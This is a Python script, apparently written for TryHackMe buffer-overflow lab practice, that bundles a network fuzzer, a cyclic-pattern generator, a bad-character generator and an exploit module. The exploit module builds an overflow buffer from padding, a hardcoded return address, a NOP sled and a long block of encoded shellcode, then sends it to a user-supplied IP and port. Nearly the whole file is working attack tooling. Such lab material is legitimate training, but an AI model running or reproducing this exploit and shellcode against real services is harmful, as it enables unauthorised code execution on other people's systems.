#!/usr/bin/env python3

# Buffer Overflow Exploit Helper
# todo:
#   - add cyclic pattern code
#   - automate cyclic portion
#   - figure out how to recv() until server stops sending info (if possible)
# 

# UPDATE ADDRESS, PADDING AND PAYLOAD MANUALLY IN THIS FILE

import socket 
import time
import sys

# CHANGE THIS IF NECESSARY
debug_mode = 0 # are we in debug/development mode (do not send actual data)


# Main function
def main():
    if sys.argv[1] == "pattern" or sys.argv[1] == "bad_chars":
        if sys.argv[1] == "pattern":
            generate_pattern()
        elif sys.argv[1] == "bad_chars":
            bad_chars()
    else:
        ip = input("Input target IP: ")
        port = int(input("Input target Port: "))

    if sys.argv[1] == "fuzzer":
        fuzzer(ip, port)
    
    if sys.argv[1] == "exploit":
        exploit(ip, port)


# BOF fuzzer code from TryHackMe 
def fuzzer(ip, port):
    print("Fuzzing IP: \"" + ip + "\"")
    print("      Port: " + str(port))
    timeout = 5
    prefix = "OVERFLOW1 "  

    string = prefix + "A" * 100 # sends prefix (8 len) and 100 A's

    if debug_mode == 0:
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:            # sets up connection to IP
                    s.settimeout(timeout)                                               # set timeout 
                    s.connect((ip, port))                                               # connect to port and ip
                    s.recv(1024)                                                        # receives 1024 bits
                    print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                    s.send(bytes(string, "latin-1"))
                    s.recv(1024)
            except:
                print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
                sys.exit(0)
            string += 100 * "A"
            time.sleep(1)
    else:
        print("We are in debugging mode... would have sent data to server!")


# BOF exploit code from TryHackMe
def exploit(ip, port):
    prefix = "OVERFLOW1 "
    
    offset = int(input("\nInput offset # (set to 0 if you don't know): "))
    
    # MIGHT HAVE TO UDPATE THIS
    padding = "\x90" * 16
    
    # UPDATE THIS - ENSURE YOU TYPE ADRESS IN BACKWARDS BY TWOS \xaa\xbb\xcc\xdd
    retn = "\xaf\x11\x50\x62"
    
    # MIGHT HAVE TO UPDATE THIS
    payload = input("\nInput payload (leave blank if you don't know)\n\tIf you want to send list of potentially bad characters type \"bad_chars\"\n\tIf you want to send manually typed list (editing this code) type \"manual_list\": ")
    if payload == "bad_chars":
        payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    elif payload == "manual_list":
        # list of possible chars for reference: \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
        # remove stuff from variable below; copy and paste original string in above comment to ensure nothing is missing
        payload = ("\xda\xd7\xbe\xba\xe8\x3a\xe2\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x75\x17\x03\x75\x17\x83\x7f\xec\xd8\x17\x83\x05\x9e"
"\xd8\x7b\xd6\xff\x51\x9e\xe7\x3f\x05\xeb\x58\xf0\x4d\xb9\x54"
"\x7b\x03\x29\xee\x09\x8c\x5e\x47\xa7\xea\x51\x58\x94\xcf\xf0"
"\xda\xe7\x03\xd2\xe3\x27\x56\x13\x23\x55\x9b\x41\xfc\x11\x0e"
"\x75\x89\x6c\x93\xfe\xc1\x61\x93\xe3\x92\x80\xb2\xb2\xa9\xda"
"\x14\x35\x7d\x57\x1d\x2d\x62\x52\xd7\xc6\x50\x28\xe6\x0e\xa9"
"\xd1\x45\x6f\x05\x20\x97\xa8\xa2\xdb\xe2\xc0\xd0\x66\xf5\x17"
"\xaa\xbc\x70\x83\x0c\x36\x22\x6f\xac\x9b\xb5\xe4\xa2\x50\xb1"
"\xa2\xa6\x67\x16\xd9\xd3\xec\x99\x0d\x52\xb6\xbd\x89\x3e\x6c"
"\xdf\x88\x9a\xc3\xe0\xca\x44\xbb\x44\x81\x69\xa8\xf4\xc8\xe5"
"\x1d\x35\xf2\xf5\x09\x4e\x81\xc7\x96\xe4\x0d\x64\x5e\x23\xca"
"\x8b\x75\x93\x44\x72\x76\xe4\x4d\xb1\x22\xb4\xe5\x10\x4b\x5f"
"\xf5\x9d\x9e\xf0\xa5\x31\x71\xb1\x15\xf2\x21\x59\x7f\xfd\x1e"
"\x79\x80\xd7\x36\x10\x7b\xb0\x32\xe8\x95\xeb\x2b\xf0\x99\xfa"
"\xf7\x7d\x7f\x96\x17\x28\x28\x0f\x81\x71\xa2\xae\x4e\xac\xcf"
"\xf1\xc5\x43\x30\xbf\x2d\x29\x22\x28\xde\x64\x18\xff\xe1\x52"
"\x34\x63\x73\x39\xc4\xea\x68\x96\x93\xbb\x5f\xef\x71\x56\xf9"
"\x59\x67\xab\x9f\xa2\x23\x70\x5c\x2c\xaa\xf5\xd8\x0a\xbc\xc3"
"\xe1\x16\xe8\x9b\xb7\xc0\x46\x5a\x6e\xa3\x30\x34\xdd\x6d\xd4"
"\xc1\x2d\xae\xa2\xcd\x7b\x58\x4a\x7f\xd2\x1d\x75\xb0\xb2\xa9"
"\x0e\xac\x22\x55\xc5\x74\x42\xb4\xcf\x80\xeb\x61\x9a\x28\x76"
"\x92\x71\x6e\x8f\x11\x73\x0f\x74\x09\xf6\x0a\x30\x8d\xeb\x66"
"\x29\x78\x0b\xd4\x4a\xa9")

    postfix = input("\nInput postfix (leave blank if you don't know): ")
    
    overflow = "A" * offset
    buffer = prefix + overflow + retn + padding + payload + postfix

    if debug_mode == 0:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            print("Sending evil buffer...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
        except:
            print("Could not connect.")
    else:
        print("Would've sent generated buffer to server")


def generate_pattern():
    print("In generate_pattern function")
    
    pattern = ""
    pattern_len = len(pattern)
    desired_len = int(input("Input how many characters you want to generate: "))
    cap_letter = 65
    lower_letter = 97
    number = 0

    # mod 0 == A; mod 1 == a; mod 2 == 1
    for i in range(0, desired_len):
        if i < 3: # just want this for first 3
            if i % 3 == 0:
                pattern += chr(cap_letter)
            elif i % 3 == 1:
                pattern += chr(lower_letter)
            elif i % 3 == 2:
                pattern += str(number)
                number = number + 1

        else: 
            if i % 3 == 0:
                pattern += chr(cap_letter)
            elif i % 3 == 1:
                if lower_letter == 123:
                    lower_letter = 97
                    pattern += chr(lower_letter)
                else:
                    pattern += chr(lower_letter)
            elif i % 3 == 2:
                if number == 9:
                    lower_letter = lower_letter + 1
                    if lower_letter == 123: # previous lower letter was z
                        cap_letter = cap_letter + 1 # increment capital letter
                    pattern += str(number)
                    number = 0
                else:
                    pattern += str(number)
                    number = number + 1
        
        
    
    print("Generated the following pattern:")
    print("")
    print(pattern)


def bad_chars():
    print("Generated the following bad characters: ")
    print("")
    for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')
    print("")

# verify arguments
# name of file counts as one argument
if len(sys.argv) != 2:                                                                      # checks if there are the correct number of arguments
    print("\nERROR: Incorrect number of arguments!\n")                                      # print error message
    print("\tUsage: python3 file.py [module]")                                              # print usage
    print("\tModules: [fuzzer] [exploit] [pattern] [bad_chars]")                            # print possible modules
    print("\n\tfuzzer: Repeatedly sends strings of A's until crash (increments by 100)")    # explains fuzzer module
    print("\texploit: Start the exploit process")                                           # explains exploit module
    print("\tpattern: Creates a pattern string, length based on user")                      # explains pattern module
    print("\tbad_chars: Creates a string of bad characters")                                # explains bad_chars module
    quit()                                                                                  # exit program
else:
    if sys.argv[1] != "fuzzer" and sys.argv[1] != "exploit" and sys.argv[1] != "pattern" and sys.argv[1] != "bad_chars":    # checks args 
        print("\nERROR: Module not found!\n")                                                   # print error message
        print("\tModules: [fuzzer] [exploit] [pattern] [bad_chars]")                            # print possible modules
        print("\n\tfuzzer: Repeatedly sends strings of A's until crash (increments by 100)")    # explains fuzzer module
        print("\texploit: Start the exploit process")                                           # explains exploit module
        print("\tpattern: Creates a pattern string, length based on user")                      # explains pattern module
        print("\tbad_chars: Creates a string of bad characters")                                # explains bad_chars module
        quit()                                                                                  # exit program


# Enter main if no problems with arguments
if __name__ == "__main__":
        main()